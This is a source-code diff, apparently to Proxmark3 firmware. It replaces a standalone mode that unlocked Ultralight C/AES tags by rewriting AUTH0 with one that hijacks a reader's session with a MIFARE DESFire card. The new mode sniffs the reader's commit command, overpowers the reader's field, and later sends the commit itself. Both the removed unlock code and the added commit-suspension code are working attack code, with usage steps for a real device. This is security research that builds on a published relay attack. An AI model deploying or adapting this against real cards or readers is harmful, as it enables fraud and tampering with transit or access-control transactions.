@@ -15,25 +15,27 @@
 // See LICENSE.txt for the text of the license.
 //-----------------------------------------------------------------------------
 //
-// Standalone mode: unlock Ultralight C / AES tags
+// Standalone mode: Suspend commit on DESFire
 //
 // Disclaimer:
 //   This is a proof of concept, not a polished tool.
 //
 // Description:
 //   It attempts to take over an authenticated session between a reader and
-//   an Ultralight C or Ultralight AES tag, and rewrite the AUTH0 page to unlock the tag.
+//   a DESFire tag, and suspend the commit operation.
 //   In principle, this requires a relay attack implying two Proxmark3 devices,
 //   but this code allows to do it with a single Proxmark3.
+//   The original relay attack was presented by Rory Flynn in his thesis
+//   "An investigation of possible attacks on the MIFARE DESFire EV1 smartcard used in public transportation", 2019
 //
 // Principle of operation:
-//   It starts as a sniffer, waiting for an authentication between a reader and a tag.
-//   Once it detects the tag's response to the authentication challenge,
+//   It starts as a sniffer, waiting for a commit operation between a reader and a tag.
+//   Once it detects the beginning of a reader commit command, it waits until the CRC is about to come in, then
 //   it quickly switches to reader mode to take over the reader field.
 //   If the tag is positioned to have a much stronger coupling with the Proxmark3
 //   than with the reader, the Proxmark3 field will obliterate the reader field,
 //   keeping the tag powered and blocking the reader's commands.
-//   Then, once the reader is moved away, the Proxmark3 can send the command to rewrite AUTH0.
+//   Then, once the reader is moved away, the Proxmark3 can recompute the CRC and send the commit command.
 //
 // Relative positions are important:
 // - Ensure a good coupling between tag and RDV4
@@ -42,25 +44,23 @@
 //
 // Limitations:
 // - So far, it only works with RDV4 (which has a 9V antenna driver vs. the 5V of Easy versions)
-// - ULC: only if AUTH0 not locked (Lock byte 3, bit 1=0)
-// - ULAES: only if SEC_MSG_ACT=0 and LOCK_USR_CFG=0
+// - EV3 may have a Transaction Timer configured as a countermeasure. EV1 and EV2 do not have this timer.
 //
 // Tested modes:
-// - RDV4 + ULC   + Android with TagInfo
-// - RDV4 + ULAES + RDV4 "hf mfu rdbl --key"
+// - RDV4 + MF3D42 + RDV4 "hf mfdes write ... --algo aes --commit"
 //
 // Usage:
 //     LEDS: 0 = off, 1 = on, * = blink                                 A B C D
 //     ------------------------------------------------------------------------
 //     Start standalone mode                                         => * 0 0 1
-//     Place an Ultralight C or Ultralight AES tag on the Proxmark3
-//         if the pm3 detects an UL-C or an UL-AES:                  => 1 * 0 0
+//     Place a DESFire tag on the Proxmark3
+//         if the pm3 detects it:                                    => 1 * 0 0
 //     Bring tag and pm3 slowly towards the authenticating reader
-//         if the pm3 detects a successful authentication:           => 1 1 * 0
+//         if the pm3 detects a commit command:                      => 1 1 * 0
 //     Pull the tag and Proxmark3 together away from the reader
 //     Press the button 1 second and release it
-//         if the pm3 managed to rewrite AUTH0:                      => 1 1 1 1
-//         if it failed to write AUTH0, D will blink very fast       => 1 1 1 *
+//         if the pm3 managed to commit:                             => 1 1 1 1
+//         if it failed to commit, D will blink very fast            => 1 1 1 *
 //     Press the button and release it
 //         exit standalone mode                                      => 0 0 0 0
 
@@ -81,19 +81,21 @@
 
 typedef enum {
     ST_LOOK_FOR_CARD = 0,
-    ST_SNIFF_AUTH,
+    ST_SNIFF_COMMIT,
     ST_WAIT_BUTTON,
     ST_WAIT_BUTTON_RELEASE,
-    ST_WRITE_AUTH0,
+    ST_COMMIT,
     ST_EXIT
 } state_t;
 
 typedef enum {
     TAG_NONE = 0,
-    TAG_ULC,
-    TAG_ULAES,
-    TAG_OTHER
+    TAG_MFDES,
+    TAG_OTHER,
 } tag_t;
+
+static uint8_t commitCmd[256];
+static uint16_t commitCmdLen;
 
 static void blink_led_slow(uint8_t led) {
     LED(led, 1);
@@ -111,69 +113,44 @@ static void blink_led_fast(uint8_t led) {
 
 static bool find_tag(tag_t *tag_type) {
     *tag_type = TAG_NONE;
-    iso14443a_setup(FPGA_HF_ISO14443A_READER_MOD);
-    LED_D_OFF();
-    iso14a_card_select_t card;
-    if (iso14443a_select_card(NULL, &card, NULL, true, 0, true) == false) {
-        goto out;
-    }
-    // Dbprintf("Found card with SAK: %02X, ATQA: %02X %02X", card.sak, card.atqa[0], card.atqa[1]);
-    if (card.sak != 0x00 || card.atqa[0] != 0x44 || card.atqa[1] != 0x00) {
-        *tag_type = TAG_OTHER;
-        // DbpString("Not an Ultralight C / Ultralight AES tag. Ignoring...");
-        goto out;
-    }
     iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);
     LED_D_OFF();
-    if (iso14443a_select_card(NULL, &card, NULL, true, 0, true) == false) {
+    iso14a_card_select_t card;
+    if (iso14443a_select_card(NULL, &card, NULL, true, 0, false) == false) {
+        goto out;
+    }
+
+    Dbprintf("Found card with SAK: %02X, ATQA: %02X %02X", card.sak, card.atqa[0], card.atqa[1]);
+    if (card.sak != 0x20) {
+        *tag_type = TAG_OTHER;
+        DbpString("Not a DESFire tag. Ignoring...");
         goto out;
     }
     uint8_t version[10] = {0x00};
     uint16_t version_len = 0;
-    uint8_t version_cmd[3] = {MIFARE_ULEV1_VERSION, 0x00, 0x00};
+    uint8_t version_cmd[8] = {0x02, 0x90, MFDES_GET_VERSION, 0x00, 0x00, 0x00, 0x00, 0x00};
     AddCrc14A(version_cmd, sizeof(version_cmd) - 2);
     ReaderTransmit(version_cmd, sizeof(version_cmd), NULL);
     version_len = ReaderReceive(version, ARRAYLEN(version), NULL);
-    switch (version_len) {
-        case 0x0A: {
-            if ((memcmp(version, "\x00\x04\x03\x01\x04\x00\x0F\x03", 8) == 0) ||
-                    (memcmp(version, "\x00\x04\x03\x02\x04\x00\x0F\x03", 8) == 0) ||
-                    (memcmp(version, "\x00\x04\x03\x03\x04\x00\x0F\x03", 8) == 0)) {
-                *tag_type = TAG_ULAES;
-                // DbpString("Found Ultralight AES");
-            }
-            break;
-        }
-        case 0x00:
-        case 0x01: {
-            if (iso14443a_select_card(NULL, &card, NULL, true, 0, true) == false) {
-                goto out;
-            }
-            uint8_t resp[19] = {0x00}; // 19 in case somehow an UL-AES reaches here
-            uint16_t resp_len = 0;
-            uint8_t auth_cmd[4] = {MIFARE_ULC_AUTH_1, 0x00, 0x00, 0x00};
-            AddCrc14A(auth_cmd, sizeof(auth_cmd) - 2);
-            ReaderTransmit(auth_cmd, sizeof(auth_cmd), NULL);
-            resp_len = ReaderReceive(resp, ARRAYLEN(resp), NULL);
-            if (resp_len == 11) {
-                *tag_type = TAG_ULC;
-                // DbpString("Found Ultralight C");
-            }
-            break;
-        }
-        default:
-            *tag_type = TAG_OTHER;
-            // DbpString("Not an Ultralight C / Ultralight AES tag. Ignoring...");
-            break;
+    // Dbprintf("GetVersion resp(%u):", version_len);
+    // Dbhexdump(version_len, version, 0);
+    if ((version_len >= 3) && (version[1] == 0x04) && ((version[2] & 0x0F) == 0x01)) {
+        *tag_type = TAG_MFDES;
+        DbpString("Found DESFire");
+        goto out;
     }
+    *tag_type = TAG_OTHER;
 out:
     FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
     return *tag_type != TAG_NONE;
 }
 
-// Derived from SniffIso14443a, but only sniffing tag responses
-// wait for mutual auth and check for RndA' size
-static bool RAMFUNC sniff_wait_for_rnda_reply(tag_t type) {
+static tUart14a *uart;
+static tDemod14a *demod;
+
+// Derived from SniffIso14443a
+// wait for commit command
+static bool RAMFUNC sniff_wait_for_commit(tag_t type) {
 
     iso14443a_setup(FPGA_HF_ISO14443A_SNIFFER);
 
@@ -181,8 +158,7 @@ static bool RAMFUNC sniff_wait_for_rnda_reply(tag_t type) {
     // free all previous allocations first
     BigBuf_free();
     BigBuf_Clear_ext(false);
-    bool found_rnda_reply = false;
-    bool found_auth_key0 = false;
+    bool found_commit = false;
 
     // The command (reader -> tag) that we're receiving.
     uint8_t *receivedCmd = BigBuf_calloc(MAX_FRAME_SIZE);
@@ -214,9 +190,6 @@ static bool RAMFUNC sniff_wait_for_rnda_reply(tag_t type) {
     }
 
     uint32_t rx_samples = 0;
-
-    tUart14a *uart = GetUart14a();
-    tDemod14a *demod = GetDemod14a();
 
     // loop and listen
     uint32_t ledb_counter = 0;
@@ -263,25 +236,28 @@ static bool RAMFUNC sniff_wait_for_rnda_reply(tag_t type) {
 
             if (!TagIsActive) { // no need to try decoding reader data if the tag is sending
                 uint8_t readerdata = (previous_data & 0xF0) | (*data >> 4);
-
                 if (MillerDecoding(readerdata, (rx_samples - 1) * 4)) {
                     // Dbprintf("Received reader command (%i):", uart->len);
                     // Dbhexdump(uart->len, receivedCmd, 0);
-                    if (type == TAG_ULAES && uart->len == 4 && receivedCmd[0] == 0x1A) {
-                        if (receivedCmd[1] == 0x00) {
-                            found_auth_key0 = true;
-                        } else if ((receivedCmd[1] == 0x01) || (receivedCmd[1] == 0x02)) {
-                            // Ignore authentications with UIDRetrKey or OriginalityKey
-                            // as they won't allow rewriting AUTH0
-                            found_auth_key0 = false;
-                        }
-                    }
                     // ready to receive another command
                     Uart14aReset();
                     // reset the demod code, which might have been
                     // false-triggered by the commands from the reader
                     Demod14aReset();
+                } else {
+                    if ((uart->bitCount == 0) &&
+                            (uart->len == 6) &&
+                            (receivedCmd[1] == 0x90) &&
+                            (receivedCmd[2] == 0xC7)) {
+                        // Dbprintf("Partial commit command (%i):", uart->len);
+                        // Dbhexdump(uart->len, receivedCmd, 0);
+                        memcpy(commitCmd, receivedCmd, uart->len);
+                        commitCmdLen = uart->len + 2;
+                        found_commit = true;
+                        goto out;
+                    }
                 }
+
                 ReaderIsActive = (uart->state != STATE_14A_UNSYNCD);
             }
 
@@ -291,16 +267,6 @@ static bool RAMFUNC sniff_wait_for_rnda_reply(tag_t type) {
                 if (ManchesterDecoding(tagdata, 0, (rx_samples - 1) * 4)) {
                     // Dbprintf("Received tag response (%i):", demod->len);
                     // Dbhexdump(demod->len, receivedResp, 0);
-
-                    // Watch for RNDA': 1+8+2 (ULC) or 1+16+2 (ULAES)
-                    if (type == TAG_ULC && demod->len == 11 && receivedResp[0] == 0x00) {
-                        found_rnda_reply = true;
-                        goto out;
-                    } else if (type == TAG_ULAES && found_auth_key0 && demod->len == 19 && receivedResp[0] == 0x00) {
-                        found_rnda_reply = true;
-                        found_auth_key0 = false;
-                        goto out;
-                    }
 
                     // ready to receive another response.
                     Demod14aReset();
@@ -320,7 +286,7 @@ static bool RAMFUNC sniff_wait_for_rnda_reply(tag_t type) {
         }
     } // end main loop
 out:
-    if (found_rnda_reply) {
+    if (found_commit) {
         // Bring HF on to take over reader field
         iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);
         LED_D_OFF();
@@ -329,57 +295,39 @@ out:
     }
     FpgaDisableTracing();
     FpgaDisableSscDma();
-    return found_rnda_reply;
+    return found_commit;
 }
 
-static bool write_auth0(tag_t type) {
-    // Write AUTH0 depending on tag type
-    // UL-C:   block 0x2A -> 30000000
-    // UL-AES: block 0x29 -> 0000003C
+static bool commit(tag_t type) {
     bool success = false;
-    uint8_t cmd[8] = {MIFARE_ULC_WRITE};
-    if (type == TAG_ULC) {
-        cmd[1] = 0x2A;
-        cmd[2] = 0x30;
-        cmd[3] = 0x00;
-        cmd[4] = 0x00;
-        cmd[5] = 0x00;
-    } else if (type == TAG_ULAES) {
-        cmd[1] = 0x29;
-        cmd[2] = 0x00;
-        cmd[3] = 0x00;
-        cmd[4] = 0x00;
-        cmd[5] = 0x3C;
-    } else {
-        goto out;
-    }
-
-    uint8_t resp[1] = {0x00};
+    uint8_t resp[15] = {0x00};
     uint16_t resp_len = 0;
-    AddCrc14A(cmd, 6);
-    ReaderTransmit(cmd, sizeof(cmd), NULL);
+    AddCrc14A(commitCmd, 6);
+    ReaderTransmit(commitCmd, commitCmdLen, NULL);
     resp_len = ReaderReceive(resp, ARRAYLEN(resp), NULL);
-    // Dbprintf("Write AUTH0 resp(%u): %02X", resp_len, resp[0]);
-    if (resp_len == 1 && resp[0] == 0x0A) {
+    Dbprintf("Commit resp(%u): %02X %02X", resp_len, resp[resp_len - 4], resp[resp_len - 3]);
+    if (resp_len > 4 && resp[resp_len - 4] == 0x91 && resp[resp_len - 3] == 0x00) {
         success = true;
     }
-
-out:
     FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
     return success;
 }
 
 void ModInfo(void) {
-    DbpString("Ultralight C / Ultralight AES unlocker by Philippe Teuwen");
+    DbpString("DESFire suspended commit by Philippe Teuwen");
 }
 
 void RunMod(void) {
     state_t state = ST_LOOK_FOR_CARD;
     tag_t tag_type = TAG_NONE;
 
+    uart = GetUart14a();
+    demod = GetDemod14a();
+
     StandAloneMode();
-    Dbprintf("Doegox Ultralight C / Ultralight AES unlocker started");
+    Dbprintf("Doegox DESFire suspended commit started");
     FpgaDownloadAndGo(FPGA_BITSTREAM_HF);
+    set_tracing(false);
     LEDsoff();
     bool welcome_state_look = true;
     bool welcome_state_sniff = true;
@@ -393,19 +341,14 @@ void RunMod(void) {
         switch (state) {
             case ST_LOOK_FOR_CARD: {
                 if (welcome_state_look) {
-                    Dbprintf("Place an Ultralight C or Ultralight AES tag on the Proxmark3.");
+                    Dbprintf("Place a DESFire tag on the Proxmark3.");
                     welcome_state_look = false;
                 }
                 blink_led_slow(LED_A);
                 if (find_tag(&tag_type)) {
-                    if (tag_type == TAG_ULC) {
-                        DbpString("Found Ultralight C tag!");
-                        state = ST_SNIFF_AUTH;
-                        // SpinDelay(1000);
-                        break;
-                    } else if (tag_type == TAG_ULAES) {
-                        DbpString("Found Ultralight AES tag!");
-                        state = ST_SNIFF_AUTH;
+                    if (tag_type == TAG_MFDES) {
+                        DbpString("Found DESFire tag!");
+                        state = ST_SNIFF_COMMIT;
                         // SpinDelay(1000);
                         break;
                     } else {
@@ -418,17 +361,17 @@ void RunMod(void) {
                 }
                 break;
             }
-            case ST_SNIFF_AUTH: {
+            case ST_SNIFF_COMMIT: {
                 if (welcome_state_sniff) {
                     Dbprintf("Bring the tag and Proxmark3 together slowly towards the authenticating reader.");
                     welcome_state_sniff = false;
                 }
                 LED_A_ON();
                 LED_B_ON();
-                if (sniff_wait_for_rnda_reply(tag_type)) {
+                if (sniff_wait_for_commit(tag_type)) {
                     LED_B_ON();
                     LED_C_ON();
-                    DbpString("Card is authenticated!");
+                    DbpString("Reader wants to commit!");
                     state = ST_WAIT_BUTTON;
                 }
                 break;
@@ -451,20 +394,20 @@ void RunMod(void) {
                 LED_B_ON();
                 blink_led_slow(LED_C);
                 if (BUTTON_PRESS() == false) {
-                    state = ST_WRITE_AUTH0;
+                    state = ST_COMMIT;
                 }
                 break;
             }
-            case ST_WRITE_AUTH0: {
+            case ST_COMMIT: {
                 LED_A_ON();
                 LED_B_ON();
                 LED_C_ON();
-                if (write_auth0(tag_type)) {
-                    Dbprintf("AUTH0 written! Press the button to exit.");
+                if (commit(tag_type)) {
+                    Dbprintf("Commit successful! Press the button to exit.");
                     LED_D_ON();
                     while (!BUTTON_PRESS()) {}
                 } else {
-                    Dbprintf("AUTH0 write failed. Press the button to exit.");
+                    Dbprintf("Commit failed. Press the button to exit.");
                     while (!BUTTON_PRESS()) {
                         blink_led_fast(LED_D);
                     }
